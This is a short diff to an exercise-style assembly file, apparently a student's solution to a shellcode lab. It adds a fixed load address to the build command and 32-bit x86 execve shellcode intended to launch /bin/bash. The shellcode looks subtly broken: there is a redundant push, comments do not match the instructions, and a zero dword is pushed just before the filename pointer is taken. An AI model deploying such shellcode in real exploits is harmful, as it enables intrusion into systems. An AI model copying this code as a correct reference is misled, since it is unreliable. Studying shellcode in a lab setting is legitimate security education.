@@ -21,6 +21,7 @@
 
   To build shellcode:
     $ gcc -static -nostartfiles -Wl,--section-start=.text=0x[BASE ADDRESS OF SHELLCODE GOES HERE, WITHOUT THE BRACKETS] 1.2.11_helper.S -o 1.2.11_helper.o
+    $ gcc -static -nostartfiles -Wl,--section-start=.text=0xfffecef8 1.2.11_helper.S -o 1.2.11_helper.o
     $ objcopy -j .text -O binary 1.2.11_helper.o 1.2.11_helper
 
     The generated shellcode in flat binary form is 1.2.11_helper. Do whatever you
@@ -43,6 +44,26 @@ _start:
 #endif
 
 // YOUR ASSEMBLY GOES HERE
+push   $0xb
+push   $0xb
+pop    %eax # eax=0xb
+cltd        # zero edx
+push   %edx # push zero termination
+#push   $0x68732f2f
+#push   $0x6e69622f
+
+push $0x68736162
+push $0x2f2f2f2f
+push $0x6e69622f # /bin/bash padded to alignment
+
+push %edx
+
+
+mov    %esp,%ebx # New stackfram
+push   %edx      # zero edx
+push   %ebx      # zero ebx
+mov    %esp,%ecx # ecx = str_location
+int    $0x80
 
 #ifdef TEST
 leave
